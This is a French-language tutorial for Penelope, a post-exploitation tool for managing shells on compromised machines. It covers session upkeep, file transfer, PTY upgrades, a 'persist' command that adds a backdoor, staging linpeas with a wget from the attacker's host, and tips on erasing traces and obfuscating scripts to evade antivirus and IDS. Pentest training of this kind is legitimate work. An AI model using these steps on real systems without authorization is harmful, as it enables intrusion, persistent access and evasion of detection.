# Penelope

## Penelope - Gestion Avancée de Shells pour la Post-Exploitation

***

### Introduction

**Penelope** est un outil polyvalent conçu pour la gestion avancée de shells interactifs dans un environnement de post-exploitation. Il permet aux pentesters et chercheurs en sécurité de maintenir des connexions fiables avec des cibles compromises, d'exécuter des commandes ou scripts à distance, et de gérer plusieurs sessions simultanées.

Grâce à ses fonctionnalités telles que l'auto-upgrade en shell PTY, la gestion de la persistance et un serveur HTTP intégré, Penelope simplifie considérablement les étapes critiques de la post-exploitation.

***

### 🚀 Étape 1 : Installation de Penelope

#### Pré-requis

1. **Python 3.6 ou version ultérieure** :
   *   Vérifiez votre version de Python :

       ```bash
       python3 --version
       ```
2. **Cloner le dépôt GitHub de Penelope** :
   *   Téléchargez Penelope depuis son dépôt officiel :

       ```bash
       git clone https://github.com/penelope/penelope.git
       ```
3.  **Naviguer dans le répertoire Penelope** :

    ```bash
    cd penelope
    ```
4. **Installer les dépendances** :
   *   Utilisez `pip` pour installer les modules nécessaires :

       ```bash
       pip install -r requirements.txt
       ```

***

### 🛠️ Étape 2 : Utilisation de Base

***

#### 1. Établir une Connexion avec une Cible

Pour établir une connexion avec une cible compromise, utilisez la commande suivante :

```bash
python3 penelope.py -t <target_ip> -p <target_port>
```

* **Explication** :
  * `-t` : Spécifie l'adresse IP de la cible.
  * `-p` : Indique le port sur lequel se connecter (par défaut, 22 pour SSH ou 4444 pour un reverse shell).

***

#### 2. Téléchargement et Upload de Fichiers

**a) Télécharger un fichier depuis la machine cible**

```bash
download /path/to/remote/file /path/to/local/destination
```

* **Explication** :
  * Télécharge un fichier spécifique depuis la cible vers votre machine.

**b) Uploader un fichier vers la cible**

```bash
upload /path/to/local/file /path/to/remote/destination
```

* **Explication** :
  * Envoie un fichier local (par exemple, un script de post-exploitation) vers la cible.

***

#### 3. Maintenir des Sessions Multiples

Penelope permet de maintenir plusieurs sessions actives avec une cible. Si une session est perdue, elle est automatiquement recréée.

```bash
python3 penelope.py --maintain 2
```

* **Explication** :
  * `--maintain` : Spécifie le nombre de sessions à maintenir (2 dans cet exemple).

***

#### 4. Auto-Upgrade en Shell PTY

Dès qu'une connexion est établie, Penelope tente d'upgrader automatiquement un shell simple en PTY (Pseudo-Terminal) pour permettre des commandes interactives comme `nano` ou `top`.

**Si l’upgrade n’est pas automatique, utilisez la commande :**

```bash
upgrade
```

* **Explication** :
  * Convertit le shell actuel en un terminal interactif.

***

### 🔍 Étape 3 : Fonctionnalités Avancées

***

#### 1. Ajouter de la Persistance

Penelope peut maintenir l'accès à une machine compromise même après un redémarrage ou une interruption de session.

**Commande :**

```bash
persist
```

* **Explication** :
  * Configure un mécanisme de persistance, comme l'ajout d'un backdoor.

***

#### 2. Utiliser le Serveur HTTP Intégré

Penelope inclut un serveur HTTP intégré pour partager facilement des fichiers entre votre machine et la cible.

**Démarrer le serveur HTTP :**

```bash
python3 penelope.py -s --port 8000
```

* **Explication** :
  * `-s` : Active le serveur HTTP.
  * `--port` : Spécifie le port du serveur (8000 dans cet exemple).

***

#### 3. Exécuter des Scripts Locaux sur la Cible

Penelope permet d'uploader et d'exécuter des scripts locaux directement sur la machine cible.

**Commande :**

```bash
run /path/to/script.sh
```

* **Explication** :
  * Exécute le script spécifié et affiche les résultats dans la session en cours.

***

### 📋 Scénarios d’Utilisation

***

#### Exemple 1 : Maintenir un Accès Constant à une Machine

Si vous souhaitez maintenir deux sessions actives avec une machine cible pour éviter toute perte d'accès, utilisez la commande suivante :

```bash
python3 penelope.py --maintain 2
```

Penelope régénérera automatiquement une nouvelle session si une des connexions est interrompue.

***

#### Exemple 2 : Exécuter des Scripts de Post-Exploitation

**a) Uploader un script de post-exploitation**

```bash
upload linpeas.sh /tmp
```

**b) Exécuter le script sur la machine cible**

```bash
run /tmp/linpeas.sh
```

* **Explication** :
  * `linpeas.sh` est un script d’énumération populaire pour identifier des failles ou des privilèges à exploiter.

***

#### Exemple 3 : Partager des Fichiers via le Serveur HTTP Intégré

1.  **Démarrer le serveur HTTP** sur votre machine :

    ```bash
    python3 penelope.py -s --port 8080
    ```
2.  **Télécharger le fichier depuis la cible** : Sur la machine cible, exécutez :

    ```bash
    wget http://<your_ip>:8080/file_to_download
    ```

***

### 📖 Bonnes Pratiques

#### 1. Obtenir des Autorisations Légales

* Assurez-vous toujours d’avoir une autorisation explicite pour tester ou accéder à un système.

#### 2. Maintenir la Discrétion

* Évitez d’uploader ou d'exécuter des fichiers inutiles pour réduire les traces laissées.
*   Supprimez les fichiers sensibles après l'utilisation :

    ```bash
    rm /tmp/linpeas.sh
    ```

#### 3. Éviter les Détections

* Si la cible dispose d'un antivirus ou d’un IDS, modifiez vos scripts ou utilisez des versions obfusquées.

#### 4. Planifier des Points de Reconnexion

* Utilisez la persistance avec parcimonie pour éviter de déclencher des alertes réseau.

***

### Conclusion

**Penelope** est un outil indispensable pour les pentesters cherchant à simplifier la gestion des shells et des connexions post-exploitation. Grâce à ses fonctionnalités telles que le maintien de sessions multiples, l’auto-upgrade des shells en PTY, et un serveur HTTP intégré, il facilite grandement les étapes complexes de post-exploitation. Que ce soit pour uploader des scripts, maintenir un accès persistant ou gérer des fichiers à distance, **Penelope** s'impose comme un choix fiable et puissant.
